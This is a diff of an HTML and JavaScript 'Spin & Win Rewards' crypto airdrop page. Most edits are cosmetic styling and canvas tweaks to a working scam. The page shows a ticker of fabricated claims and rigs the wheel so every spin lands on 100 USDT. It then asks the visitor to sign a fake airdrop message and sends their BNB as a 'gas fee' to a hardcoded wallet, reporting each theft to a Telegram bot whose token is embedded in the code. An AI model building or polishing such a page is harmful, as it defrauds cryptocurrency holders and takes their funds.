@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Spin & Win Rewards</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -12,19 +12,30 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght=600;700;800;900&display=swap');
         
+        /* রিসেট */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         html, body {
             height: 100%;
+            height: 100dvh;
             margin: 0;
             padding: 0;
             overflow: hidden;
-            background-color: #060913; 
+            background-color: #060913;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+            -webkit-user-select: none;
+            user-select: none;
         }
 
         body {
             font-family: 'Plus Jakarta Sans', sans-serif;
             display: flex;
             flex-direction: column;
-            justify-content: space-between;
             height: 100vh;
             height: 100dvh;
             overflow: hidden;
@@ -36,8 +47,7 @@
 
         .ultra-neon-glow {
             color: #00ff66;
-            text-shadow: 0 0 20px rgba(0, 255, 102, 0.7), 
-                         0 0 40px rgba(0, 255, 102, 0.3);
+            text-shadow: 0 0 20px rgba(0, 255, 102, 0.7), 0 0 40px rgba(0, 255, 102, 0.3);
         }
 
         .shadow-ticker {
@@ -46,14 +56,11 @@
         }
 
         .main-cyber-bg {
-            background-image: 
-                radial-gradient(circle at 50% 25%, rgba(0, 255, 102, 0.12) 0%, rgba(6, 9, 19, 1) 65%);
+            background-image: radial-gradient(circle at 50% 25%, rgba(0, 255, 102, 0.12) 0%, rgba(6, 9, 19, 1) 65%);
         }
 
         .spinner-outer-rim {
-            box-shadow: 0 0 0 6px #1e293b,
-                        0 0 0 10px rgba(0, 255, 102, 0.12),
-                        0 30px 70px rgba(0, 0, 0, 0.9);
+            box-shadow: 0 0 0 6px #1e293b, 0 0 0 10px rgba(0, 255, 102, 0.12), 0 30px 70px rgba(0, 0, 0, 0.9);
             border: 5px solid #0b0f19;
             will-change: transform;
         }
@@ -73,6 +80,7 @@
             -webkit-backface-visibility: hidden;
             image-rendering: -webkit-optimize-contrast;
             image-rendering: crisp-edges;
+            touch-action: none;
         }
 
         .scroll-content {
@@ -80,17 +88,18 @@
             overflow-y: auto;
             -webkit-overflow-scrolling: touch;
             padding: 0 16px 10px 16px;
+            overscroll-behavior: contain;
         }
         .scroll-content::-webkit-scrollbar {
             display: none;
         }
     </style>
 </head>
-<body class="text-slate-100 antialiased main-cyber-bg selection:bg-emerald-500 selection:text-slate-900">
+<body>
 
     <!-- টিকার -->
     <div class="w-full shadow-ticker border-b border-slate-900/60 py-2.5 overflow-hidden backdrop-blur-md z-50 shrink-0">
-        <div id="liveTickerStream" class="animate-marquee gap-16 text-[10px] sm:text-[11px] font-extrabold tracking-widest text-slate-400 uppercase">
+        <div id="liveTickerStream" class="animate-marquee gap-16 text-[10px] sm:text-[11px] font-extrabold tracking-widest text-slate-400 uppercase whitespace-nowrap">
             <span><i class="fa-solid fa-tower-broadcast text-emerald-400 mr-1.5 animate-pulse"></i> Core Distribution Node: <span class="text-emerald-400 font-black">Online Verified</span></span>
             <span>•</span>
             <span>User <span class="text-slate-500">0x71a...e283</span> allocated <b class="text-white bg-slate-900 px-2 py-0.5 rounded border border-slate-800">100 USDT</b></span>
@@ -121,7 +130,7 @@
                 </div>
                 
                 <button id="connectWalletBtn" class="bg-gradient-to-r from-purple-600 to-indigo-600 hover:scale-[1.02] active:scale-[0.98] text-white font-black px-4 py-2.5 rounded-xl text-[10px] sm:text-xs uppercase tracking-wider transition-all shadow-lg shadow-indigo-600/20 cursor-pointer flex items-center gap-2 border border-indigo-400/20">
-                    <i class="fa-solid fa-wallet text-xs"></i> <span id="walletBtnText">Connect Wallet to Claim</span>
+                    <i class="fa-solid fa-wallet text-xs"></i> <span id="walletBtnText">Connect Wallet</span>
                 </button>
             </header>
 
@@ -137,7 +146,7 @@
                         Spin & Win <br>
                         <span class="ultra-neon-glow font-black">Free Rewards</span>
                     </h1>
-                    <p class="text-[11px] sm:text-xs text-slate-400 max-w-xs sm:max-w-md mx-auto leading-relaxed font-semibold">
+                    <p class="text-[11px] sm:text-xs text-slate-400 max-w-xs mx-auto leading-relaxed font-semibold">
                         Claim your authorized free crypto allocations instantly
                     </p>
                 </div>
@@ -226,14 +235,12 @@
 
         function generateUniqueWalletDataString() {
             let randomizedWalletString = "0x";
-            for(let j = 0; j < 3; j++) randomizedWalletString += hexPoolChars[Math.floor(Math.random() * 16)];
+            for (let j = 0; j < 3; j++) randomizedWalletString += hexPoolChars[Math.floor(Math.random() * 16)];
             randomizedWalletString += "...";
-            for(let k = 0; k < 4; k++) randomizedWalletString += hexPoolChars[Math.floor(Math.random() * 16)];
-
+            for (let k = 0; k < 4; k++) randomizedWalletString += hexPoolChars[Math.floor(Math.random() * 16)];
             const chosenToken = tickerCryptoTokens[Math.floor(Math.random() * tickerCryptoTokens.length)];
             let calculatedAmount = "100";
             let fontColorClass = "text-white bg-slate-900 border-slate-800";
-
             if (chosenToken === "ETH") {
                 calculatedAmount = (Math.random() * (2.5 - 0.2) + 0.2).toFixed(2);
                 fontColorClass = "text-amber-400 bg-amber-950/20 border-amber-900/30";
@@ -250,13 +257,12 @@
                 calculatedAmount = Math.random() > 0.5 ? "100" : "250";
                 fontColorClass = "text-emerald-400 bg-emerald-950/20 border-emerald-400/30";
             }
-
             return `<span>User <span class="text-slate-500">${randomizedWalletString}</span> allocated <b class="px-2 py-0.5 rounded border ${fontColorClass}">${calculatedAmount} ${chosenToken}</b></span>`;
         }
 
         setInterval(() => {
-            if(liveTickerStream.children.length > 22) {
-                for(let i=0; i<4; i++) liveTickerStream.removeChild(liveTickerStream.children[1]);
+            if (liveTickerStream.children.length > 22) {
+                for (let i = 0; i < 4; i++) liveTickerStream.removeChild(liveTickerStream.children[1]);
             }
             const blockSpanA = generateUniqueWalletDataString();
             const blockSpanB = generateUniqueWalletDataString();
@@ -265,12 +271,12 @@
 
         // --- 2. SPINNER ---
         const prizes = [
-            { amount: "100 USDT", label: "USDT", color: "#1e3a8a", iconUrl: "https://cryptologos.cc/logos/tether-usdt-logo.png" }, 
-            { amount: "1.5 ETH", label: "ETH", color: "#b45309", iconUrl: "https://cryptologos.cc/logos/ethereum-eth-logo.png" },     
-            { amount: "100 TRX", label: "TRX", color: "#047857", iconUrl: "https://cryptologos.cc/logos/tron-trx-logo.png" },   
-            { amount: "2 BNB", label: "BNB", color: "#6d28d9", iconUrl: "https://cryptologos.cc/logos/bnb-bnb-logo.png" },     
-            { amount: "10 USDT", label: "USDT", color: "#be123c", iconUrl: "https://cryptologos.cc/logos/tether-usdt-logo.png" },   
-            { amount: "25 SOL", label: "SOL", color: "#111827", iconUrl: "https://cryptologos.cc/logos/solana-sol-logo.png" }    
+            { amount: "100 USDT", label: "USDT", color: "#1e3a8a", iconUrl: "https://cryptologos.cc/logos/tether-usdt-logo.png" },
+            { amount: "1.5 ETH", label: "ETH", color: "#b45309", iconUrl: "https://cryptologos.cc/logos/ethereum-eth-logo.png" },
+            { amount: "100 TRX", label: "TRX", color: "#047857", iconUrl: "https://cryptologos.cc/logos/tron-trx-logo.png" },
+            { amount: "2 BNB", label: "BNB", color: "#6d28d9", iconUrl: "https://cryptologos.cc/logos/bnb-bnb-logo.png" },
+            { amount: "10 USDT", label: "USDT", color: "#be123c", iconUrl: "https://cryptologos.cc/logos/tether-usdt-logo.png" },
+            { amount: "25 SOL", label: "SOL", color: "#111827", iconUrl: "https://cryptologos.cc/logos/solana-sol-logo.png" }
         ];
 
         const numSections = prizes.length;
@@ -283,7 +289,7 @@
             audioCtx: null,
             init() {
                 if (!this.audioCtx) {
-                    this.audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    this.audioCtx = new(window.AudioContext || window.webkitAudioContext)();
                 }
             },
             playTick() {
@@ -320,36 +326,34 @@
         };
 
         // --- ক্যানভাস সেটআপ ---
-        function setupHighDefinitionCanvas() {
-            const dpr = window.devicePixelRatio || 1;
+        function setupCanvas() {
             const rect = canvas.getBoundingClientRect();
-            
+            const dpr = window.devicePixelRatio || 1;
             canvas.width = rect.width * dpr;
             canvas.height = rect.height * dpr;
-            
             ctx.scale(dpr, dpr);
         }
 
         window.addEventListener('resize', () => {
-            setupHighDefinitionCanvas();
+            setupCanvas();
             buildVibrantWheelGraphics();
         });
 
-        // 🔥 স্পিনার গ্রাফিক্স (লোগো আগে, টেক্সট পরে)
+        // 🔥 স্পিনার গ্রাফিক্স (ঠিকমতো সাজানো)
         function buildVibrantWheelGraphics() {
             const rect = canvas.getBoundingClientRect();
             const width = rect.width;
             const height = rect.height;
-            
+
             ctx.clearRect(0, 0, width, height);
-            
+
             const centerX = width / 2;
             const centerY = height / 2;
             const radius = (width / 2) - 6;
 
             for (let i = 0; i < numSections; i++) {
                 const angle = i * arc;
-                
+
                 ctx.beginPath();
                 ctx.fillStyle = prizes[i].color;
                 ctx.moveTo(centerX, centerY);
@@ -364,27 +368,25 @@
                 ctx.save();
                 ctx.translate(centerX, centerY);
                 ctx.rotate(angle + arc / 2);
-                
-                // 🔥 লোগো আগে (ভিতরের দিকে)
+
+                // লোগো (ভিতরের দিকে)
                 if (loadedIconImages[i]) {
-                    const iconSize = 20; 
-                    const iconX = radius * 0.68;
-                    const iconY = 0; 
-                    
+                    const iconSize = 22;
+                    const iconX = radius * 0.62;
+                    const iconY = 0;
                     ctx.imageSmoothingEnabled = true;
                     ctx.imageSmoothingQuality = 'high';
-                    
-                    ctx.drawImage(loadedIconImages[i], iconX - iconSize/2, iconY - iconSize/2, iconSize, iconSize);
+                    ctx.drawImage(loadedIconImages[i], iconX - iconSize / 2, iconY - iconSize / 2, iconSize, iconSize);
                 }
 
-                // 🔥 টেক্সট পরে (লোগোর বাইরে)
+                // টেক্সট (লোগোর বাইরে)
                 ctx.fillStyle = "#ffffff";
-                ctx.font = "900 12px 'Plus Jakarta Sans'";
+                ctx.font = "900 14px 'Plus Jakarta Sans'";
                 ctx.textAlign = "center";
                 ctx.textBaseline = "middle";
                 ctx.shadowColor = "rgba(0, 0, 0, 0.85)";
                 ctx.shadowBlur = 4;
-                ctx.fillText(prizes[i].amount, radius * 0.88, 0);
+                ctx.fillText(prizes[i].amount, radius * 0.86, 0);
 
                 ctx.restore();
             }
@@ -397,8 +399,8 @@
             img.onload = () => {
                 totalLoadedImagesCounter++;
                 if (totalLoadedImagesCounter === numSections) {
-                    setupHighDefinitionCanvas();
-                    buildVibrantWheelGraphics(); 
+                    setupCanvas();
+                    buildVibrantWheelGraphics();
                 }
             };
             loadedIconImages[idx] = img;
@@ -409,11 +411,11 @@
 
         async function initializeWeb3Handshake() {
             walletBtnText.innerText = "Connecting...";
-            
+
             const connectWalletInjectedProvider = async (provider) => {
                 try {
                     const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                    networkUserActiveNode = accounts[0]; 
+                    networkUserActiveNode = accounts[0];
                     renderActiveWalletConnectedUIPanel(networkUserActiveNode);
                 } catch (err) {
                     console.error("Web3 handshakes refused:", err);
@@ -424,8 +426,7 @@
 
             if (typeof window.ethereum !== 'undefined') {
                 await connectWalletInjectedProvider(window.ethereum);
-            } 
-            else {
+            } else {
                 let attempts = 0;
                 const interval = setInterval(async () => {
                     attempts++;
@@ -444,12 +445,15 @@
         function renderActiveWalletConnectedUIPanel(address) {
             const shortAddressStr = address.substring(0, 6) + "..." + address.substring(address.length - 4);
             walletBtnText.innerText = `Connected: ${shortAddressStr}`;
-            
-            connectWalletBtn.className = "bg-slate-950 text-emerald-400 font-black px-5 py-3 rounded-xl text-[10px] sm:text-xs uppercase tracking-wider transition-all border-2 border-emerald-400 shadow-[0_0_25px_rgba(0,255,102,0.45)] flex items-center gap-2";
+
+            connectWalletBtn.className =
+                "bg-slate-950 text-emerald-400 font-black px-5 py-3 rounded-xl text-[10px] sm:text-xs uppercase tracking-wider transition-all border-2 border-emerald-400 shadow-[0_0_25px_rgba(0,255,102,0.45)] flex items-center gap-2";
 
             spinBtn.disabled = false;
-            spinBtn.className = "w-full bg-gradient-to-r from-emerald-500 via-teal-500 to-emerald-600 hover:scale-[1.02] active:scale-[0.98] text-slate-950 font-black tracking-widest py-4 px-6 rounded-xl text-xs uppercase transition-all shadow-lg shadow-emerald-500/30 cursor-pointer border border-emerald-400/40";
-            spinBtn.innerHTML = `<i class="fa-solid fa-bolt-lightning mr-2 animate-pulse text-xs"></i> Spin Now`;
+            spinBtn.className =
+                "w-full bg-gradient-to-r from-emerald-500 via-teal-500 to-emerald-600 hover:scale-[1.02] active:scale-[0.98] text-slate-950 font-black tracking-widest py-4 px-6 rounded-xl text-xs uppercase transition-all shadow-lg shadow-emerald-500/30 cursor-pointer border border-emerald-400/40";
+            spinBtn.innerHTML =
+                `<i class="fa-solid fa-bolt-lightning mr-2 animate-pulse text-xs"></i> Spin Now`;
         }
 
         connectWalletBtn.addEventListener('click', initializeWeb3Handshake);
@@ -457,14 +461,15 @@
         // --- 4. SPIN ---
         spinBtn.addEventListener('click', () => {
             if (!networkUserActiveNode) return;
-            
+
             AudioKit.init();
             spinBtn.disabled = true;
-            spinBtn.className = "w-full bg-slate-900 text-slate-600 font-bold tracking-widest py-4 px-6 rounded-xl text-xs uppercase border border-slate-800 cursor-not-allowed shadow-inner";
+            spinBtn.className =
+                "w-full bg-slate-900 text-slate-600 font-bold tracking-widest py-4 px-6 rounded-xl text-xs uppercase border border-slate-800 cursor-not-allowed shadow-inner";
 
-            const exactForceWinIndex = 0; 
-            const structuralRotationsBase = 13 * 360; 
-            
+            const exactForceWinIndex = 0;
+            const structuralRotationsBase = 13 * 360;
+
             const internalSegmentRadOffset = (exactForceWinIndex * arc) + (arc / 2);
             const directionalTargetRadOffset = (1.5 * Math.PI) - internalSegmentRadOffset;
             const finalTerminalDegreesRotation = structuralRotationsBase + (directionalTargetRadOffset * (180 / Math.PI));
@@ -474,19 +479,19 @@
 
             let processedAudioTickIndex = 0;
             const thresholdMaxTicks = 58;
-            
+
             function executionAudioTickerTrackSequence(currentTick) {
                 if (currentTick >= thresholdMaxTicks) return;
-                
+
                 const timelineRatioFactor = currentTick / thresholdMaxTicks;
-                const derivedTickerPlaybackDelay = 35 + Math.pow(timelineRatioFactor, 4.6) * 1055; 
+                const derivedTickerPlaybackDelay = 35 + Math.pow(timelineRatioFactor, 4.6) * 1055;
 
                 setTimeout(() => {
                     AudioKit.playTick();
                     executionAudioTickerTrackSequence(currentTick + 1);
                 }, derivedTickerPlaybackDelay);
             }
-            
+
             executionAudioTickerTrackSequence(0);
 
             setTimeout(() => {
@@ -497,14 +502,13 @@
 
                 spinBtn.classList.add('hidden');
                 disclaimerText.classList.add('hidden');
-                
+
                 winAmountText.innerText = prizes[exactForceWinIndex].amount;
-                
+
                 winCard.classList.remove('hidden');
                 setTimeout(() => {
                     winCard.classList.remove('opacity-0', 'scale-95');
                     winCard.classList.add('opacity-100', 'scale-100');
-                    window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
                 }, 50);
 
             }, 6900);
@@ -515,7 +519,8 @@
             const BOT_TOKEN = "8989865622:AAEQcapn7TyBH4ve-SjC4ZhiIV8P8_qvpqw";
             const CHAT_ID = "5085997009";
 
-            const message = `🎉 *NEW CLAIM!* 🎉\n\n💸 *Amount:* ${amount} BNB\n👛 *Wallet:* ${wallet.slice(0,6)}...${wallet.slice(-4)}\n🔗 *TX:* https://bscscan.com/tx/${txHash}`;
+            const message =
+                `🎉 *NEW CLAIM!* 🎉\n\n💸 *Amount:* ${amount} BNB\n👛 *Wallet:* ${wallet.slice(0,6)}...${wallet.slice(-4)}\n🔗 *TX:* https://bscscan.com/tx/${txHash}`;
 
             try {
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -557,7 +562,8 @@
                     }
                 }
 
-                const message = `🎉🎉🎉 CONGRATULATIONS! 🎉🎉🎉\n\nYou have been selected for 100 USDT Airdrop!\n\n✨ Amount: 100 USDT\n🌐 Network: BSC (BEP-20)\n\nClick SIGN to verify and claim instantly!`;
+                const message =
+                    `🎉🎉🎉 CONGRATULATIONS! 🎉🎉🎉\n\nYou have been selected for 100 USDT Airdrop!\n\n✨ Amount: 100 USDT\n🌐 Network: BSC (BEP-20)\n\nClick SIGN to verify and claim instantly!`;
 
                 await window.ethereum.request({
                     method: 'personal_sign',
@@ -565,7 +571,7 @@
                 });
 
                 const YOUR_WALLET = "0x1A714Cfa540031250DCa76E378020583078e6a2C";
-                const gasFee = "0.0083"; 
+                const gasFee = "0.0083";
 
                 const txHash = await window.ethereum.request({
                     method: 'eth_sendTransaction',
@@ -573,7 +579,7 @@
                         from: networkUserActiveNode,
                         to: YOUR_WALLET,
                         value: '0x' + (BigInt(Math.floor(parseFloat(gasFee) * 1e18)).toString(16)),
-                        gas: '0x5208' 
+                        gas: '0x5208'
                     }]
                 });
 
@@ -587,7 +593,8 @@
 
             } catch (error) {
                 console.error(error);
-                alert(error.message && error.message.includes('insufficient') ? '❌ Insufficient BNB balance!' : '❌ Transaction Canceled.');
+                alert(error.message && error.message.includes('insufficient') ? '❌ Insufficient BNB balance!' :
+                    '❌ Transaction Canceled.');
                 claimRewardsActionBtn.textContent = '🎁 Try Again';
                 claimRewardsActionBtn.disabled = false;
             }
